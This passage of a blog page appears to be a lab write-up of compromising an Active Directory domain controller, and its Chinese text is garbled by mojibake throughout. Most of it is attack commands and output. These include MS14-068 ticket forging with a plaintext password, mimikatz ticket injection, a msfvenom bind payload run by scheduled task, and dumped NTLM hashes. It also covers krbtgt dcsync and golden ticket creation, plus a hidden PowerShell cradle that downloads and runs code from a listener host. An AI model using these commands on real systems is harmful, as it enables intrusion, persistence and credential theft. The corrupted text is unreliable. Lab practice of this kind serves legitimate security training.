id="fnref2">[2]</a></sup>ã€‚æœ€å¥½è¿˜æ˜¯ç”¨<code>kali</code>ï¼Œæ²¡è¿™ä¹ˆå¤šéº»çƒ¦ã€‚</p><h4 id="nmapé€šè¿‡proxychainsæ‰«æåŸŸæ§è®¾å¤‡">nmapé€šè¿‡proxychainsæ‰«æåŸŸæ§è®¾å¤‡</h4><p>ä¿®æ”¹<code>proxychains</code>çš„é…ç½®æ–‡ä»¶ï¼Œä½¿å…¶ä»£ç†èµ°çš„æ˜¯<code>127.0.0.1 1080</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195812729.png" alt="image-20250513195812729"></p><p>æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -A -Pn 10.10.10.149</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195644245.png" alt="image-20250513195644245"></p><h4 id="æ°¸æ’ä¹‹è“ms17-010è¿›è¡Œæº¢å‡ºæ”»å‡»DC-å¤±è´¥">æ°¸æ’ä¹‹è“ms17-010è¿›è¡Œæº¢å‡ºæ”»å‡»DC(å¤±è´¥)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.10.10.149</span><br><span class="line">set RPORT 445</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513200141843.png" alt="image-20250513200141843"></p><p>æ”»å‡»å¤±è´¥ã€‚</p><h4 id="ms14-068ææƒåŸŸæ§">ms14-068ææƒåŸŸæ§</h4><h5 id="ms14-068çš„æ¡ä»¶">ms14-068çš„æ¡ä»¶</h5><ul><li>è·å–åŸŸæ™®é€šç”¨æˆ·çš„è´¦å·å¯†ç <code>web@hackbox.com/!@#Qwe456</code></li><li>è·å–åŸŸæ™®é€šç”¨æˆ·çš„<code>SID: S-1-5-21-2005268815-658469957-1189185684-1103</code></li><li>æœåŠ¡å™¨æœªæ‰“<code>KB3011780</code>è¡¥ä¸</li><li>åŸŸæ§æœåŠ¡å™¨çš„<code>10.10.10.149</code></li></ul><h5 id="ms14-068åˆ›å»ºç¥¨æ®">ms14-068åˆ›å»ºç¥¨æ®</h5><p>ä¸Šä¼ <code>MS14-068.exe</code><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>åˆ°æ‰§è¡Œçš„ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210324509.png" alt="image-20250513210324509"></p><h5 id="è½½å…¥kiwiæ¸…ç†å†…å­˜ç¥¨æ®ï¼Œå†å¯¼å…¥ç¥¨æ®">è½½å…¥kiwiæ¸…ç†å†…å­˜ç¥¨æ®ï¼Œå†å¯¼å…¥ç¥¨æ®</h5><p>è½½å…¥<code>kiwi</code>ï¼Œæ¸…ç†å½“å‰çš„ç¥¨æ®ï¼Œå¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_purge</span><br><span class="line">kerberos_ticket_list</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210716497.png" alt="image-20250513210716497"></p><p>å¯¼å…¥ç¥¨æ®ç¥¨æ®éƒ¨åˆ†ã€‚</p><p>ä¸‹è½½<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>ï¼Œå¹¶ä¸Šä¼ <code>mimikatz.exeã€mimidrv.sysã€mimilib.dll</code>åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®å½•ï¼Œè¿è¡Œ<code>mimikatz.exe</code>ã€‚</p><p>å¹¶æ‰§è¡Œ<code>kerberos::ptc TGT_web@hackbox.com.ccache</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513212954123.png" alt="image-20250513212954123"></p><p><code>exit</code>é€€å‡º<code>mimikatz</code>ï¼Œ<code>klist</code>æŸ¥çœ‹å½“å‰ç¥¨æ®ã€‚</p><p>æœªå¯¼å…¥ç¥¨æ®å‰å»è®¿é—®<code>dc</code>ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513211928318.png" alt="image-20250513211928318"></p><p>æ­¤æ—¶å»è®¿é—®<code>dc</code>åŸŸæ§ï¼ŒæˆåŠŸè®¿é—®ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513213205104.png" alt="image-20250513213205104"></p><h4 id="è·å–dcåŸŸæ§åˆ¶æƒé™">è·å–dcåŸŸæ§åˆ¶æƒé™</h4><h5 id="ç”Ÿæˆæ­£å‘è½½è·-copyå¤åˆ¶åˆ°åŸŸæ§-å¹¶æ‰§è¡Œå®šæ—¶ä»»åŠ¡">ç”Ÿæˆæ­£å‘è½½è·,copyå¤åˆ¶åˆ°åŸŸæ§,å¹¶æ‰§è¡Œå®šæ—¶ä»»åŠ¡</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=13777 -f exe -o bind.exe</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ<code>bind.exe</code>ï¼Œå¹¶ä¸Šä¼ è‡³<code>web</code>ç«™ç‚¹çš„æœåŠ¡å™¨ï¼Œå¹¶å¤åˆ¶åˆ°åŸŸæ§ä¸­å»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy bind.exe \\dc\C$\  # å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡</span><br><span class="line">net time \\dc # æŸ¥è¯¢dcæ—¶é—´</span><br><span class="line">at \\dc 21:51:00 c:/bind.exe #å¢åŠ å®šæ—¶ä»»åŠ¡æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513214855544.png" alt="image-20250513214855544"></p><h5 id="è·å–åŸŸæ§æƒé™å‘½ä»¤">è·å–åŸŸæ§æƒé™å‘½ä»¤</h5><p>è®¾ç½®å¥½å®šçš„æ—¶é—´ï¼Œ<code>msf</code>è¿›è¡Œç›‘å¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.149</span><br><span class="line">set lport 13777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥è‡³åŸŸæ§ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513222709163.png" alt="image-20250513222709163"></p><h4 id="è·å–dcåŸŸæ§å“ˆå¸Œæ˜æ–‡">è·å–dcåŸŸæ§å“ˆå¸Œæ˜æ–‡</h4><p>è¿ç§»è¿›ç¨‹ï¼Œå¹¶è·å“ˆå¸Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">migrate 388</span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223358934.png" alt="image-20250513223358934"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98:::</span><br><span class="line">web:1103:aad3b435b51404eeaad3b435b51404ee:086a0bb1ed4ec72250760ea531bf8074:::</span><br><span class="line"><span class="meta prompt_">DC$</span><span class="language-bash">:1000:aad3b435b51404eeaad3b435b51404ee:961b3511aef13bfc4498d1e767ee2422:::</span></span><br><span class="line"><span class="meta prompt_">WEB$</span><span class="language-bash">:1104:aad3b435b51404eeaad3b435b51404ee:2a0edff7f95894d229b63285d32fc9c7:::</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>load kiwi</code>ï¼Œå¹¶æ‰§è¡Œ<code>creds_tspkg</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223728435.png" alt="image-20250513223728435"></p><h4 id="æŠ“åŸŸæ§å…¨éƒ¨hash">æŠ“åŸŸæ§å…¨éƒ¨hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224001261.png" alt="image-20250513224001261"></p><h4 id="åˆ¶ä½œé»„é‡‘ç¥¨æ®">åˆ¶ä½œé»„é‡‘ç¥¨æ®</h4><p>è€ƒè™‘é•¿æœŸæƒç»´æŠ¤ï¼Œè¿˜æ˜¯åšä¸€ä¸ªé»„é‡‘ç¥¨æ®æ¯”è¾ƒä¿é™©ã€‚</p><p>åˆ¶ä½œé»„é‡‘ç¥¨æ®éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li><code>krbtgt</code>çš„<code>hash</code></li><li>æœ¬åœ°ç®¡ç†å‘˜æƒé™</li><li>åŸŸçš„<code>SID</code>ï¼ˆæ™®é€šç”¨æˆ·çš„<code>SID</code>é™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„<code>SID</code>ï¼‰</li><li>åŸŸå†…ä»»æ„ç”¨æˆ·çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™</li></ul><h4 id="è·å–ntml-sid-rid">è·å–ntml sid rid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224618826.png" alt="image-20250513224618826"></p><p>è·å–åˆ°çš„<code>SID: S-1-5-21-2005268815-658469957-1189185684-502</code></p><h4 id="çªƒå–åŸŸæ§è¶…çº§ç®¡ç†æƒé™">çªƒå–åŸŸæ§è¶…çº§ç®¡ç†æƒé™</h4><p>ç³»ç»Ÿæƒé™æ²¡åŠæ³•åš<code>dcsync</code>æ‰€ä»¥åˆ‡æ¢åŸŸç®¡ç†æƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token 2092</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224933391.png" alt="image-20250513224933391"></p><p>è·å–åˆ°çš„å†…å®¹ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class="line">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆé»„é‡‘ç¥¨æ®">ç”Ÿæˆé»„é‡‘ç¥¨æ®</h4><p>è·å–åˆ°çš„æ¡ä»¶å¦‚ä¸‹ï¼š</p><p>1ã€<code>krbtgt</code>çš„<code>hash</code>ï¼š<code>6f60ace6accbcb76078ccc0312174e98</code></p><p>2ã€æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼šå·²è·å–</p><p>3ã€åŸŸçš„<code>SID</code>ï¼ˆæ™®é€šç”¨æˆ·çš„<code>SID</code>é™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„<code>SID</code>ï¼‰ï¼š<code>S-1-5-21-2005268815-658469957-1189185684</code></p><p>4ã€åŸŸå†…ä»»æ„ç”¨æˆ·çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼šå·²è·å–ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d &lt;åŸŸå&gt; -u &lt;ä»»æ„ç”¨æˆ·å&gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket æœ¬</span><br><span class="line">åœ°å­˜å‚¨è·¯å¾„å¦‚:/Users/x2n/Desktop/webhack123.com/krbtgt.ticket&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®è·å–çš„æ¡ä»¶ï¼Œè¿›è¡Œé»„é‡‘ç¥¨æ®çš„ç”Ÿæˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u x2ntest -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230047465.png" alt="image-20250513230047465"></p><p>åˆ‡æ¢åˆ°<code>web</code>æœåŠ¡å™¨ï¼ŒæŠŠå‡­æ®éƒ½æ¸…é™¤æ‰ã€‚ä½¿ç”¨<code>kerberos_ticket_purge</code>ï¼Œç¡®ä¿<code>dc</code>æ˜¯æ— æ³•è®¿é—®çš„ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230617747.png" alt="image-20250513230617747"></p><p>æ­¤æ—¶ä½¿ç”¨ç”Ÿæˆçš„ç¥¨æ®<code>kerberos_ticket_use /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</code>ï¼ŒæˆåŠŸè®¿é—®åˆ°åŸŸæ§ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513231036926.png" alt="image-20250513231036926"></p><h3 id="CSè¿›è¡Œå†…ç½‘åŸŸæ¸—é€">CSè¿›è¡Œå†…ç½‘åŸŸæ¸—é€</h3><h4 id="å»ºç«‹teamserver">å»ºç«‹teamserver</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.1.3 4477 # 4477ä¸ºå¯†ç </span><br></pre></td></tr></table></figure><p>è®¾ç½®å¥½ç›‘å¬å™¨ï¼Œç›‘å¬<code>192.168.1.3</code>ï¼Œç›‘å¬çš„ç«¯å£ä¸º<code>8085</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512201453122.png" alt="image-20250512201453122"></p><h4 id="åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸‹è½½powershellæ¶æ„ä»£ç ">åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸‹è½½powershellæ¶æ„ä»£ç </h4><p>ä½¿ç”¨<code>Windows Executable</code>å»ç”Ÿæˆ<code>.ps1</code>æ–‡ä»¶ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204448238.png" alt="image-20250512204448238"></p><p>å†ä½¿ç”¨é’“é±¼æ”»å‡»ä¸­çš„æ–‡ä»¶ä¸‹è½½ï¼Œè·å–ä¸‹è½½çš„<code>URL</code>ï¼Œä¸º<code>http://192.168.1.3:8022/tt</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204756691.png" alt="image-20250512204756691"></p><p>è¿›è¡Œä¸Šçº¿ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.3:8022/tt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204314027.png" alt="image-20250512204314027"></p><h4 id="è®¾ç½®é—´éš”æ—¶é—´">è®¾ç½®é—´éš”æ—¶é—´</h4><p>è®¾ç½®æ—¶é—´é—´éš”ä¸º0ï¼Œä¸ç„¶ä¼šå½±å“åé¢çš„æ“ä½œã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204952134.png" alt="image-20250512204952134"></p><h4 id="è·å–hashå’ŒåŸŸå†…ä¿¡ä»»ä¸»æœº">è·å–hashå’ŒåŸŸå†…ä¿¡ä»»ä¸»æœº</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">net view</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205228670.png" alt="image-20250512205228670"></p><h4 id="æ‰«æç¯å¢ƒå†…ä¸»æœº">æ‰«æç¯å¢ƒå†…ä¸»æœº</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205837345.png" alt="image-20250512205837345"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210232067.png" alt="image-20250512210232067"></p><p>æ‰«æç»“æœå¦‚ä¸‹ï¼Œå­˜åœ¨ä¸»æœº<code>10.10.10.149</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210509148.png" alt="image-20250512210509148"></p><h4 id="åˆ©ç”¨csé›†æˆå‘½ä»¤è¿›è¡Œä¿¡æ¯æ”¶é›†">åˆ©ç”¨csé›†æˆå‘½ä»¤è¿›è¡Œä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net computers</span><br><span class="line">net domain</span><br><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211214829.png" alt="image-20250512211214829"></p><h4 id="cs-mimikatz-webæœåŠ¡è·å–æ˜æ–‡">cs mimikatz webæœåŠ¡è·å–æ˜æ–‡</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211552406.png" alt="image-20250512211552406"></p><h4 id="dirè®¿é—®åŸŸæ§DC">dirè®¿é—®åŸŸæ§DC</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell \\dc\c$</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512212553216.png" alt="image-20250512212553216"></p><h4 id="cs-ms14-068ææƒåˆ°åŸŸæ§">cs ms14-068ææƒåˆ°åŸŸæ§</h4><p>ä¸Šä¼ æ–‡ä»¶<code>ms14-068</code>åˆ°<code>web</code>æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œ<code>SID</code>æ¥æºå‰é¢<code>MSF</code>è·å–çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514000630970.png" alt="image-20250514000630970"></p><h5 id="åœ¨ms14-068-pyè„šæœ¬ä¸‹åˆ›å»ºç¥¨æ®">åœ¨ms14-068.pyè„šæœ¬ä¸‹åˆ›å»ºç¥¨æ®</h5><p>è¿˜å¯ä»¥ä½¿ç”¨<code>ms14-068.py</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>è¿›è¡Œç¥¨æ®çš„åˆ›å»ºã€‚è¿™é‡Œ<code>mac</code>ç”¨æˆ·æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œæ‰§è¡Œæ—¶å€™è¦ä½¿ç”¨åˆ°<code>python2</code>ï¼Œæˆ‘çš„<code>proxychains-ng</code>ç¼–è¯‘æˆäº†<code>arm64</code>æ ¼å¼ï¼Œä½†æ˜¯<code>ms14-068.py</code>ä½¿ç”¨çš„æ‰§è¡Œç¯å¢ƒæ˜¯<code>python2</code>ï¼Œ<code>python2</code>æ˜¯<code>x86</code>çš„ï¼ŒäºŒè€…å†²çªäº†ã€‚éš¾æâ˜¹ï¸ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514102745723.png" alt="image-20250514102745723"></p><p>è¿™é‡Œå¦‚æœä½¿ç”¨<code>kali</code>åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç›´æ¥å°±å¯ä»¥äº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python2 ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-6584D69957-1189185684-1103 -d 10.10.10.149 -p &#x27;!@#@we456&#x27;</span><br></pre></td></tr></table></figure><h5 id="KrbCredExport-å°†-ccache-æ–‡ä»¶è½¬åŒ–ä¸º-kirbi-æ ¼å¼"><strong>KrbCredExport</strong> å°† <strong>.ccache</strong> æ–‡ä»¶è½¬åŒ–ä¸º <strong>kirbi</strong> æ ¼å¼</h5><p>ä½¿ç”¨å‰é¢<code>MS14-068.exe</code>è·å–çš„<code>TGT_web@hackbox.com.ccache</code>ï¼Œä½¿ç”¨<code>KrbCredExport.py</code><sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>å°†å…¶è½¬åŒ–ä¸º<code>user.ticket</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py ./ccaches/TGT_web@hackbox.com.ccache ./tickets/user.ticket</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514103702160.png" alt="image-20250514103702160"></p><h5 id="å¯¼å…¥ç¥¨æ®è®¿é—®dc">å¯¼å…¥ç¥¨æ®è®¿é—®dc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use ./tickets/user.ticket</span><br><span class="line">shell dir \\dc\c$</span><br></pre></td></tr></table></figure><p><img 